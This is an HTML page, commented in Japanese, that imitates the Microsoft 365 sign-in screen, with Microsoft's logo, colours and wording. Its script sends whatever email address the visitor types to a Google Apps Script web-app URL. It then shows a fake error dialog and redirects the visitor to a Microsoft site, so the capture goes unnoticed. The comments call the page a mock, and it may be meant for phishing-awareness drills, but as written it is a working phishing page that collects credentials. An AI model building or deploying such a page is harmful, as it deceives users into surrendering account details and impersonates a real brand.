<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Microsoft 365</title>
<style>
:root{
    --ms-blue:#0067B8;
    --ms-blue-hover:#005A9E;
    --text:#1b1b1b;
    --sub:#605e5c;
    --muted:#8a8886;
    --border:#edebe9;
    --error:#a4262c;
    --warning-bg:#fff4ce;
    --warning-text:#8a6d00;
    --card-bg:rgba(255,255,255,.90);
}

*{ box-sizing:border-box; }

html,body{ height:100%; }

body{
    margin:0;
    min-height:100vh;
    font-family:"Segoe UI","Yu Gothic UI",system-ui,sans-serif;
    color:var(--text);
    background:
        radial-gradient(circle at 12% 18%, rgba(0,103,184,.20), transparent 28%),
        radial-gradient(circle at 88% 78%, rgba(80,180,255,.22), transparent 30%),
        linear-gradient(135deg,#f7fbff 0%,#eef5fb 43%,#f8f7fb 100%);
    display:flex;
    justify-content:center;
    align-items:center;
    overflow:hidden;
}

/* ---------- 背景装飾 ---------- */
.background-shape{
    position:fixed;
    inset:auto auto -140px -100px;
    width:420px;
    height:420px;
    border-radius:50%;
    background:rgba(0,103,184,.10);
    filter:blur(8px);
    pointer-events:none;
}

.mock-badge{
    position:fixed;
    top:18px;
    left:18px;
    padding:7px 12px;
    border:1px solid rgba(0,0,0,.08);
    border-radius:999px;
    background:rgba(255,255,255,.72);
    backdrop-filter:blur(12px);
    font-size:12px;
    color:#4b5563;
    letter-spacing:.02em;
    z-index:2;
}

/* ---------- サインインカード ---------- */
.login-card{
    width:430px;
    max-width:92%;
    min-height:438px;
    padding:42px 42px 34px;
    background:var(--card-bg);
    backdrop-filter:blur(22px) saturate(135%);
    border:1px solid rgba(255,255,255,.56);
    border-radius:14px;
    box-shadow:0 28px 80px rgba(31,45,61,.16), 0 2px 8px rgba(31,45,61,.06);
    z-index:1;
}

.logo{
    display:flex;
    align-items:center;
    gap:12px;
    margin-bottom:30px;
}

.logo-icon{
    width:24px;
    height:24px;
    display:grid;
    grid-template-columns:1fr 1fr;
    grid-template-rows:1fr 1fr;
    gap:2px;
}
.logo-icon div:nth-child(1){background:#F25022;}
.logo-icon div:nth-child(2){background:#7FBA00;}
.logo-icon div:nth-child(3){background:#00A4EF;}
.logo-icon div:nth-child(4){background:#FFB900;}

.logo-text{
    font-size:20px;
    font-weight:600;
    color:#323130;
}

.title{
    font-size:30px;
    line-height:1.25;
    font-weight:600;
    margin:0 0 12px;
}

.description{
    font-size:14px;
    line-height:1.7;
    color:var(--sub);
    margin-bottom:22px;
}

.input-wrap{ margin-top:4px; }

.input-box{
    width:100%;
    border:0;
    border-bottom:1px solid var(--muted);
    padding:11px 0 10px;
    font-size:15px;
    background:transparent;
    color:var(--text);
}

.input-box::placeholder{ color:#605e5c; }

.input-box:focus{
    outline:none;
    border-bottom:2px solid var(--ms-blue);
}

.input-box.invalid{
    border-bottom:2px solid var(--error);
}

.error-message{
    display:none;
    margin-top:8px;
    color:var(--error);
    font-size:13px;
    line-height:1.5;
}
.error-message.show{ display:block; }

.loading-line{
    display:none;
    align-items:center;
    gap:10px;
    margin-top:20px;
    color:#605e5c;
    font-size:14px;
    line-height:1.6;
}
.loading-line.show{ display:flex; }

.spinner{
    width:16px;
    height:16px;
    border:2px solid #d2d0ce;
    border-top-color:var(--ms-blue);
    border-radius:50%;
    animation:spin .75s linear infinite;
    flex:none;
}

@keyframes spin{ to{ transform:rotate(360deg); } }

.link{
    display:inline-block;
    margin-top:18px;
    color:var(--ms-blue);
    text-decoration:none;
    font-size:14px;
}
.link:hover{ text-decoration:underline; }

.account{
    margin-top:28px;
    font-size:14px;
    line-height:1.6;
    color:#323130;
}
.account a{
    color:var(--ms-blue);
    text-decoration:none;
}
.account a:hover{ text-decoration:underline; }

.actions{
    display:flex;
    justify-content:flex-end;
    gap:8px;
    margin-top:34px;
}

.button{
    border:0;
    background:var(--ms-blue);
    color:white;
    min-width:108px;
    height:36px;
    border-radius:4px;
    cursor:pointer;
    font-size:14px;
    font-weight:500;
    padding:0 18px;
    transition:background .16s ease, transform .16s ease, box-shadow .16s ease, opacity .16s ease;
}
.button:hover{
    background:var(--ms-blue-hover);
    box-shadow:0 4px 12px rgba(0,103,184,.22);
}
.button:active{ transform:translateY(1px); }
.button:disabled{
    cursor:not-allowed;
    opacity:.82;
    box-shadow:none;
}

/* ---------- ダイアログ ---------- */
.modal-backdrop{
    display:none;
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.36);
    backdrop-filter:blur(3px);
    z-index:20;
}
.modal-backdrop.show{ display:block; }

.error-dialog{
    display:none;
    position:fixed;
    left:50%;
    top:50%;
    width:448px;
    max-width:92%;
    transform:translate(-50%,-50%) scale(.98);
    background:#fff;
    border-radius:12px;
    box-shadow:0 24px 72px rgba(0,0,0,.28), 0 2px 8px rgba(0,0,0,.12);
    overflow:hidden;
    z-index:30;
    opacity:0;
    transition:opacity .18s ease, transform .18s ease;
}
.error-dialog.show{
    display:block;
    opacity:1;
    transform:translate(-50%,-50%) scale(1);
}

.dialog-header{
    display:flex;
    align-items:center;
    gap:10px;
    padding:20px 24px 16px;
    border-bottom:1px solid var(--border);
}

.dialog-icon{
    width:28px;
    height:28px;
    border-radius:50%;
    background:var(--warning-bg);
    color:var(--warning-text);
    display:grid;
    place-items:center;
    font-weight:700;
    flex:none;
}

.dialog-title{
    font-size:20px;
    font-weight:600;
    color:#323130;
}

.dialog-body{
    padding:22px 24px;
    color:#323130;
    font-size:14px;
    line-height:1.8;
}

.dialog-note{
    margin-top:14px;
    padding:10px 12px;
    border-left:3px solid var(--ms-blue);
    background:#f5f9fd;
    color:#605e5c;
    font-size:13px;
    line-height:1.6;
}

.dialog-footer{
    padding:16px 24px;
    display:flex;
    justify-content:flex-end;
    background:#faf9f8;
    border-top:1px solid var(--border);
}

/* ---------- フッター ---------- */
.footer{
    position:fixed;
    right:24px;
    bottom:18px;
    font-size:12px;
    color:#605e5c;
    display:flex;
    gap:18px;
    z-index:1;
}
.footer a{
    color:#605e5c;
    text-decoration:none;
}
.footer a:hover{ text-decoration:underline; }

/* ---------- Responsive ---------- */
@media (max-width:600px){
    body{ align-items:flex-start; padding-top:70px; overflow:auto; }
    .login-card{ padding:30px 28px; min-height:auto; }
    .title{ font-size:25px; }
    .footer{ left:20px; right:auto; gap:14px; }
}
</style>
</head>
<body>
<div class="background-shape" aria-hidden="true"></div>

<main class="login-card" aria-label="Microsoft 365">
    <div class="logo">
        <div class="logo-icon" aria-hidden="true">
            <div></div><div></div><div></div><div></div>
        </div>
        <div class="logo-text">Microsoft 365</div>
    </div>

    <h1 class="title">サインイン</h1>

    <div class="input-wrap">
        <input
            id="mailInput"
            type="email"
            class="input-box"
            placeholder="メールアドレス"
            autocomplete="off"
            inputmode="email"
            aria-describedby="mailError">
        <div id="mailError" class="error-message" aria-live="polite">
            メールアドレスを入力してください。
        </div>
    </div>

    <div id="loadingLine" class="loading-line" aria-live="polite">
        <span class="spinner" aria-hidden="true"></span>
        <span>サインインしています...</span>
    </div>

    <a href="#" class="link" onclick="return false;">サインイン オプション</a>

    <div class="account">
        アカウントをお持ちでない場合は <a href="#" onclick="return false;">作成できます</a>
    </div>

    <div class="actions">
        <button class="button" id="nextBtn" type="button">次へ</button>
    </div>
</main>

<div id="dialogBackdrop" class="modal-backdrop" aria-hidden="true"></div>
<div id="errorDialog" class="error-dialog" role="dialog" aria-modal="true" aria-labelledby="errorDialogTitle" aria-describedby="errorDialogBody">
    <div class="dialog-header">
        <div class="dialog-icon" aria-hidden="true">!</div>
        <div id="errorDialogTitle" class="dialog-title">問題が発生しました</div>
    </div>
    <div id="errorDialogBody" class="dialog-body">
        ログイン処理中に問題が発生したため、ページを再読み込みします。<br><br>
        ログイン画面が表示された場合は、再度ログインしてください。
    </div>
    <div class="dialog-footer">
        <button class="button" id="dialogOkBtn" type="button">OK</button>
    </div>
</div>

<footer class="footer">
    <a href="#" onclick="return false;">利用規約</a>
    <a href="#" onclick="return false;">プライバシー</a>
    <a href="#" onclick="return false;">ヘルプ</a>
</footer>

<script>
/* =========================================================
   設定値
   ========================================================= */

// OKボタン押下時の遷移先です。必要に応じて変更してください。
// 例: "index.html", "/portal/login.html", "https://example.local/login"
//const REDIRECT_URL = "login.html";
const REDIRECT_URL = "https://copilot.microsoft.com/";


// 次へ押下後、問題発生ダイアログを出すまでの待機時間です。
const MOCK_WAIT_MS = 700;

/* =========================================================
   要素取得
   ========================================================= */
const mailInput = document.getElementById("mailInput");
const mailError = document.getElementById("mailError");
const nextBtn = document.getElementById("nextBtn");
const loadingLine = document.getElementById("loadingLine");
const dialogBackdrop = document.getElementById("dialogBackdrop");
const errorDialog = document.getElementById("errorDialog");
const dialogOkBtn = document.getElementById("dialogOkBtn");

/* =========================================================
   初期処理
   - login.html?user=test@example.com
   - login.html?email=test@example.com
   のように指定すると入力欄へ事前入力します。
   ========================================================= */
function initializeInputFromQueryString(){
    const params = new URLSearchParams(window.location.search);
    const initialValue = params.get("user") || params.get("email");

    if(initialValue){
        mailInput.value = initialValue;
    }
}

/* =========================================================
   入力チェック
   ========================================================= */
function validateEmailInput(){
    const mail = mailInput.value.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    mailInput.classList.remove("invalid");
    mailError.classList.remove("show");

    if(mail === ""){
        showInputError("メールアドレスを入力してください。");
        return false;
    }

    if(!emailRegex.test(mail)){
        showInputError("有効なメールアドレスを入力してください。");
        return false;
    }

    return true;
}

function showInputError(message){
    mailError.textContent = message;
    mailError.classList.add("show");
    mailInput.classList.add("invalid");
    mailInput.focus();
}

/* =========================================================
   次へ押下時の処理
   - 実際の認証・通信は行いません。
   - 判定はせず、必ず問題発生ダイアログを表示します。
   ========================================================= */
function handleNext(){
    if(!validateEmailInput()){
        return;
    }
    
    var mailGAS = mailInput.value.trim();

    // ===== GASへ送信（重要：URLSearchParams使用）=====
    const formData = new URLSearchParams();
    formData.append("email", mailGAS);

    // デプロイ後に表示されるGASのウェブアプリURLを転記
    fetch("https://script.google.com/macros/s/AKfycbx1S-ab8k91kUPZOOwQFKvccxvk1qLK_UUdhBhaEzIJzBQfpmH8yJgYGzlOBTmn9wOqNw/exec", {
      method: "POST",
      body: formData
    })

    setLoadingState(true);

    window.setTimeout(() => {
        setLoadingState(false);
        showProblemDialog();
    }, MOCK_WAIT_MS);
}

function setLoadingState(isLoading){
    if(isLoading){
        nextBtn.textContent = "確認中...";
        nextBtn.disabled = true;
        loadingLine.classList.add("show");
    }else{
        nextBtn.textContent = "次へ";
        nextBtn.disabled = false;
        loadingLine.classList.remove("show");
    }
}

/* =========================================================
   ダイアログ表示・リダイレクト
   ========================================================= */
function showProblemDialog(){
    dialogBackdrop.classList.add("show");
    dialogBackdrop.setAttribute("aria-hidden", "false");
    errorDialog.style.display = "block";

    window.requestAnimationFrame(() => {
        errorDialog.classList.add("show");
        dialogOkBtn.focus();
    });
}

function redirectToLogin(){
    // replaceを使うことで、問題発生ダイアログ表示状態をブラウザ履歴に残しません。
    location.replace(REDIRECT_URL);
}

/* =========================================================
   イベント設定
   ========================================================= */
nextBtn.addEventListener("click", handleNext);
dialogOkBtn.addEventListener("click", redirectToLogin);

mailInput.addEventListener("keydown", (event) => {
    if(event.key === "Enter"){
        handleNext();
    }
});

mailInput.addEventListener("input", () => {
    if(mailError.classList.contains("show")){
        mailError.classList.remove("show");
        mailInput.classList.remove("invalid");
    }
});

// Escapeキーでは閉じられない設計です。
// ユーザーにOK押下と location.replace() による遷移を明示的に踏ませます。

initializeInputFromQueryString();
</script>
</body>
</html>
